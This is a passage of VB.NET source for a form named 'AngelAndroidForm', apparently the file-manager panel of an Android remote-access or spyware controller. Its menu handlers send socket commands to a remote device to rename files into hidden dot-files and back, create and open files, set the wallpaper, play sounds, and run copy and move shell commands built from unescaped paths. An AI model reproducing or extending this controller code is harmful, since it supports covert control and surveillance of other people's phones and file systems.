                    Dim name As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                    If Not name.Trim.Chars(0) = "."c Then

                        Dim neew As String = DGV0.Tag & "/." & name

                        Dim old As String = DGV0.Tag & "/" & name

                        If Not classClient Is Nothing Then

                            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "rename" & sockets.Data.SPL_DATA & old & sockets.Data.SPL_DATA & neew, Codes.Encoding().GetBytes("null"), classClient}

                            classClient.Send(objs)

                        End If

                    End If

                End If

            Next

        End If
    End Sub

    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click

        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                If Not DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag = "back" Then

                    Dim name As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                    If name.Trim.Chars(0) = "."c Then

                        Dim formatName As String = Nothing

                        Dim status As Boolean

                        For c As Integer = 0 To name.Length - 1

                            If Not name.Trim.Chars(c) = "."c Then

                                formatName &= name.Trim.Chars(c)

                                status = True

                            Else

                                If status Then

                                    formatName &= name.Trim.Chars(c)

                                End If

                            End If

                        Next

                        status = False

                        Dim neew As String = DGV0.Tag & "/" & formatName

                        Dim old As String = DGV0.Tag & "/" & name

                        If Not classClient Is Nothing Then

                            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "rename" & sockets.Data.SPL_DATA & old & sockets.Data.SPL_DATA & neew, Codes.Encoding().GetBytes("null"), classClient}

                            classClient.Send(objs)

                        End If

                    End If

                End If


            Next

        End If

    End Sub

    Private Sub AddFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddFilesToolStripMenuItem.Click

        If Not classClient Is Nothing Then

            Dim pd As New inp

            pd.Text = "Add Files"

            pd.LTitle.Text = "New name"

            pd.StartPosition = FormStartPosition.Manual

            pd.Location = Codes.FixSize(Me, pd)

            pd.BOXX.Visible = True

            Select Case pd.ShowDialog(Me)

                Case DialogResult.OK

                    If Not classClient Is Nothing Then

                        Dim isFolde As Boolean = pd.CheckFolder.Checked

                        Dim isHidden As Boolean = pd.CheckHidden.Checked

                        Dim name As String = pd.InputText.Text

                        If isHidden = True Then

                            name = "." & name

                        End If

                        Dim path As String = DGV0.Tag & "/" & name

                        Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "create" & sockets.Data.SPL_DATA & path & sockets.Data.SPL_DATA & CStr(isFolde), Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)



                    End If

            End Select

            pd.Close()

        End If

    End Sub

    Private Sub OpenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenToolStripMenuItem.Click

        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag

                If tg = "1" Then

                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                    If Not classClient Is Nothing Then

                        Dim fromExtension As String = "null"

                        If p.Contains(".") And Not p.EndsWith(".") Then

                            fromExtension = p.Substring(p.LastIndexOf(".") + 1)

                        End If

                        Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "open" & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & fromExtension, Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If



            Next

        End If
    End Sub

    Private Function ISupportedText(ByVal t As String) As Boolean '//Supported Text
        If t.Contains(".") Then
            Dim ext As String = """" & t.Substring(t.LastIndexOf(".")) & """"
            If reso.SupportedText.Contains(ext) Then
                Return True
            Else
                Return False
            End If
        Else
            Return False
        End If
        Return False
    End Function
    Private Function ISupportedImages(ByVal t As String) As Boolean '//Supported Images
        If t.Contains(".") Then
            Dim ext As String = """" & t.Substring(t.LastIndexOf(".")) & """"
            If reso.SupportedImages.Contains(ext) Then
                Return True
            Else
                Return False
            End If
        Else
            Return False
        End If
        Return False
    End Function
    Private Function ISupportedVideo(ByVal t As String) As Boolean '//Supported Video
        If t.Contains(".") Then
            Dim ext As String = """" & t.Substring(t.LastIndexOf(".")) & """"
            If reso.SupportedVideo.Contains(ext) Then
                Return True
            Else
                Return False
            End If
        Else
            Return False
        End If
        Return False
    End Function

    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub

    Private Sub BoxTitle_Click(sender As Object, e As EventArgs) Handles BoxTitle.Click

    End Sub

    Private Sub BoxTitle_Paint(sender As Object, e As PaintEventArgs) Handles BoxTitle.Paint

        If BoxTitlePaintEventArgsWait Then

            Dim DGV0Count As Integer = DGV0.Rows.Count - 1

            Dim _DGV0Count As String = "All " & CStr(DGV0Count)

            Dim CountClipboard As Integer = Clipboard.Count

            Dim _DGV0_SEL As String = "Selected " & CStr(DGV0.SelectedRows.Count) & If(CountClipboard > 0, Space(10) & "Clipboard " & CStr(Clipboard.Count), "")

            Dim clr As Color = SpySettings.DefaultColor_Foreground

            e.Graphics.DrawLine(New Pen(Color.FromArgb(50, clr.R, clr.G, clr.B)), 0, 1, BoxTitle.Width, 1)

            Dim ColorFont As Brush

            ColorFont = New SolidBrush(SpySettings.DefaultColor_Foreground)

            Dim ColorBack As Brush = New SolidBrush(Color.FromArgb(170, BoxTitle.BackColor.R, BoxTitle.BackColor.G, BoxTitle.BackColor.B))

            Dim TextRender0 As Size = TextRenderer.MeasureText(_DGV0Count & Space(10) & _DGV0_SEL, reso.f)

            Dim rect0 As New Rectangle(0, 2, BoxTitle.Width, TextRender0.Height + 5)

            e.Graphics.FillRectangle(New Pen(ColorBack).Brush, rect0)

            e.Graphics.DrawString(_DGV0Count & Space(10) & _DGV0_SEL & Space(10), reso.f, ColorFont, 0, 2)

            Dim MeSize As Size = TextRenderer.MeasureText("S", reso.f)
            If Not BoxTitle.Height = MeSize.Height + 3 Then
                BoxTitle.Height = MeSize.Height + 3
            End If

        End If

    End Sub
    Private Sub AngelAndroidForm_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        BoxTitle.Invalidate()
    End Sub
    Private Sub AngelAndroidForm_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        BoxTitle.Invalidate()
    End Sub
    Private Sub BoxTitle_Resize(sender As Object, e As EventArgs) Handles BoxTitle.Resize
        BoxTitle.Invalidate()
    End Sub

    Private Sub DGV0_RowsRemoved(sender As Object, e As DataGridViewRowsRemovedEventArgs) Handles DGV0.RowsRemoved
        BoxTitle.Invalidate()
    End Sub

    Private Sub DGV0_RowsAdded(sender As Object, e As DataGridViewRowsAddedEventArgs) Handles DGV0.RowsAdded
        BoxTitle.Invalidate()
    End Sub
    Private Sub DGV0_SelectionChanged(sender As Object, e As EventArgs) Handles DGV0.SelectionChanged
        BoxTitle.Invalidate()
    End Sub


    '#Clipboard 

    Private Clipboard As New List(Of Array)

    Private Sub Sub_Clipboard(ByVal pram As String)

        If pram = "'PASTE'" And Clipboard.Count > 0 Then


            Dim p As String = Format_Space(DGV0.Tag)

            Dim commend As String = ""

            For Each i In Clipboard

                Dim ar As Array = i

                If Not commend.Length = 0 Then

                    commend &= Space(1) & "&&" & Space(1) & ar(3) & Space(1) & ar(2) & Space(1) & p

                Else

                    commend &= ar(3) & Space(1) & ar(2) & Space(1) & p

                End If

            Next

            Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "commend" & sockets.Data.SPL_DATA & commend, Codes.Encoding().GetBytes("null"), classClient}

            classClient.Send(objs)

            Clipboard.Clear()


        Else

            Clipboard.Clear()

            If DGV0.SelectedRows.Count > 0 Then

                For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                    Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag

                    If Not tg = "back" Then

                        Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                        Dim isFile As Boolean = False

                        If tg = "1" Then

                            isFile = True

                        Else

                            isFile = False

                        End If

                        If pram = "'COPY'" Then

                            If isFile Then

                                Clipboard.Add({pram, isFile, Format_Space(p), "cp"})

                            Else

                                Clipboard.Add({pram, isFile, Format_Space(p), "cp -R"})

                            End If

                        Else

                            Clipboard.Add({pram, isFile, Format_Space(p), "mv"})

                        End If

                    End If

                Next

            End If

        End If

    End Sub
    Private Function Format_Space(ByVal prm As String) As String
        If prm.Contains(Space(1)) Then
            prm = prm.Replace(Space(1), "(U+0020)".ToLower)
        End If
        Return prm
    End Function
    Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CutToolStripMenuItem.Click
        Sub_Clipboard("'CUT'")
        BoxTitle.Invalidate()
    End Sub

    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Sub_Clipboard("'COPY'")
        BoxTitle.Invalidate()
    End Sub
    Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasteToolStripMenuItem.Click
        If Not Clipboard.Count = 0 Then
            Sub_Clipboard("'PASTE'")
        End If

        BoxTitle.Invalidate()
    End Sub

    Private Sub SetWallpaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SetWallpaperToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                If Not DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag = "back" Then

                    Dim name As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                    Dim path As String = DGV0.Tag & "/" & name

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "set_wallpaper" & sockets.Data.SPL_DATA & path, Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If



                End If

            Next

        End If
    End Sub

    Private Sub PlaySoundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PlaySoundToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then

            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1

                If Not DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag = "back" Then

                    Dim name As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value

                    Dim path As String = DGV0.Tag & "/" & name

                    If Not classClient Is Nothing Then

                        Dim objs As Object() = {Client, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "play_back" & sockets.Data.SPL_DATA & path, Codes.Encoding().GetBytes("null"), classClient}

                        classClient.Send(objs)

                    End If

                End If

            Next

        End If
    End Sub

    Private Sub ctxMenu_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ctxMenu.Opening
        Select Case ver
            Case "v1.0"
                SetWallpaperToolStripMenuItem.Visible = False
            Case Else
                SetWallpaperToolStripMenuItem.Visible = True
        End Select
    End Sub
End Class